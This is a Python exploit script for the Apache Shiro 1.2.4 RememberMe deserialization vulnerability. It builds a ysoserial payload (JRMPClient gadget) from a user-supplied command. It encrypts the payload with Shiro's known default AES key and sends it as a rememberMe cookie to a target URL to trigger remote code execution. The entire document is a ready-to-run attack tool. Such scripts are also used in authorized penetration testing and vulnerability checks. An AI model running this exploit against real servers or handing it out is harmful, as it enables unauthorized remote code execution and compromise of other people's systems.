
# pip install pycrypto for linux
# or
# pip install pycryptodome for windows

import sys,json,requests,time
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

import binascii

banner = '''

   _____ _    _ _____ _____   ____         _____ _____  ___  
  / ____| |  | |_   _|  __ \ / __ \       | ____| ____|/ _ \ 
 | (___ | |__| | | | | |__) | |  | |______| |__ | |__ | | | |
  \___ \|  __  | | | |  _  /| |  | |______|___ \|___ \| | | |
  ____) | |  | |_| |_| | \ \| |__| |       ___) |___) | |_| |
 |_____/|_|  |_|_____|_|  \_\\____/       |____/|____/ \___/ 
                                                             
            Shiro RememberMe 1.2.4 反序列化漏洞


'''
print(banner)

now = int(round(time.time()*1000))
now_time = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(now/1000))

def encode_rememberme(command):
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    # print(type(popen)) #<class 'subprocess.Popen'>
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA==" # 常量
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes # 随机值
    # print(iv)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())  
    # print(type(file_body)) # <class 'bytes'>
    # print(file_body)
    x = binascii.hexlify(file_body)
    java_hex = str(x,'ascii')
    print(java_hex)
    # java_str = str(file_body, encoding = "latin-1")

    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    # print(base64_ciphertext)
    # print(type(base64_ciphertext))
    base64_ciphertext_str = (str(base64_ciphertext, encoding = "utf-8"))
    send_exp(url,base64_ciphertext_str)
    return base64_ciphertext

def send_exp(url,base64_ciphertext_str):
    if url[-1] == '/':
      shiro_url = url
    else:
      shiro_url = url + '/'
  
    headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'User-Agent': 'HTTPie/1.0.3',
    'Content-Length': '2',
    'Cookie': 'rememberMe=%s' % base64_ciphertext_str
    }
    # print(headers['Cookie'])
    proxies = {"http":"http://127.0.0.1:8088"}
  
    r = requests.get(shiro_url, headers=headers)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'rememberMe' in response_str and 'JSESSIONID' in response_str:
      print('\n'+ now_time+'\n')
      print("[+] Send POC Success") 
      print("[+] Exit Shiro RCE Vuln")
    else:
      print(now_time+'\n')
      print("[+] No Shiro Vuln Exit!")

if __name__ == '__main__':
  if len(sys.argv) != 3:
    sys.exit("\n[+] Usage: python3 %s http://10.10.20.166:8080/shiro/ command\n" % sys.argv[0]) 
  else:
       url = sys.argv[1]  
       payload = encode_rememberme(sys.argv[2])    
       with open("payload.cookie", "w") as fpw:
           print("rememberMe={}".format(payload.decode()), file=fpw)
   
